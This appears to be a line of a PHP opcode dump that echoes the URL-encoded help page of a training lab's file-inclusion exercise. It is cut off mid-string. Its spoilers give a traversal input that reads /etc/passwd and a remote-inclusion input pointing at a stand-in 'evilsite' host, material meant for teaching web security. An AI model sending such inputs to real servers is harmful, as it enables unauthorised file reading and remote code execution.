          1*       <136> ECHO                                                      OP1[  IS_CONST (268435443) '%3Cdiv+class%3D%22body_padded%22%3E%0D%0A%09%3Ch1%3EHelp+-+File+Inclusion%3C%2Fh1%3E%0D%0A%0D%0A%09%3Cdiv+id%3D%22code%22%3E%0D%0A%09%3Ctable+width%3D%27100%25%27+bgcolor%3D%27white%27+style%3D%22border%3A2px+%23C0C0C0+solid%22%3E%0D%0A%09%3Ctr%3E%0D%0A%09%3Ctd%3E%3Cdiv+id%3D%22code%22%3E%0D%0A%09%09%3Ch3%3EAbout%3C%2Fh3%3E%0D%0A%09%09%3Cp%3ESome+web+applications+allow+the+user+to+specify+input+that+is+used+directly+into+file+streams+or+allows+the+user+to+upload+files+to+the+server.%0D%0A%09%09%09At+a+later+time+the+web+application+accesses+the+user+supplied+input+in+the+web+applications+context.+By+doing+this%2C+the+web+application+is+allowing%0D%0A%09%09%09the+potential+for+malicious+file+execution.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cp%3EIf+the+file+chosen+to+be+included+is+local+on+the+target+machine%2C+it+is+called+%22Local+File+Inclusion+%28LFI%29.+But+files+may+also+be+included+on+other%0D%0A%09%09%09machines%2C+which+then+the+attack+is+a+%22Remote+File+Inclusion+%28RFI%29.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cp%3EWhen+RFI+is+not+an+option.+using+another+vulnerability+with+LFI+%28such+as+file+upload+and+directory+traversal%29+can+often+achieve+the+same+effect.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cp%3ENote%2C+the+term+%22file+inclusion%22+is+not+the+same+as+%22arbitrary+file+access%22+or+%22file+disclosure%22.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cbr+%2F%3E%3Chr+%2F%3E%3Cbr+%2F%3E%0D%0A%0D%0A%09%09%3Ch3%3EObjective%3C%2Fh3%3E%0D%0A%09%09%3Cp%3ERead+all+five+famous+quotes+from+%27%3Ca+href%3D%22..%2Fhackable%2Fflags%2Ffi.php%22%3E..%2Fhackable%2Fflags%2Ffi.php%3C%2Fa%3E%27+using+only+the+file+inclusion.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cbr+%2F%3E%3Chr+%2F%3E%3Cbr+%2F%3E%0D%0A%0D%0A%09%09%3Ch3%3ELow+Level%3C%2Fh3%3E%0D%0A%09%09%3Cp%3EThis+allows+for+direct+input+into+%3Cu%3Eone+of+many+PHP+functions%3C%2Fu%3E+that+will+include+the+content+when+executing.%3C%2Fp%3E%0D%0A%0D%0A%09%09%3Cp%3EDepending+on+the+web+service+configuration+will+depend+if+RFI+is+a+possibility.%3C%2Fp%3E%0D%0A%09%09%3Cpre%3ESpoiler%3A+%3Cspan+class%3D%22spoiler%22%3ELFI%3A+%3Fpage%3D..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%3C%2Fspan%3E.%0D%0A%09%09%09Spoiler%3A+%3Cspan+class%3D%22spoiler%22%3ERFI%3A+%3Fpage%3Dhttp%3A%2F%2Fwww.evilsite.com%2Fevil.php%3C%2Fspan%3E.%3C%2Fpre%3E%0D%0A%0D%0A%09%09%3Cbr+%2F%3E%0D%0A%0D%0A%09%09%3Ch3%3EMedium+Level%3C%2Fh3%3E%0D%0A%09%09%3Cp%3EThe+developer+has+read+up+on+some+of+the+issues+with+LFI%2FRFI%2C+and+decided+to+filter+the+input.+However%2C+the+patterns+that+are+used%2C+isn%27t+enough.%3C%2Fp%3E%0D%0A%09%09%3Cpre%3ESpoiler%3A+%3Cspan+class%3D%22spoiler%22%3ELFI%3A+Possible%2C+due+to+it+only+cycling+through+the+pattern+matching+once%3C%2Fspan%3E.%0D%0A%09%09%09Spoiler%3A+%3Cspan+class%3D%22spoiler%22%3ERFI%3A+' ]
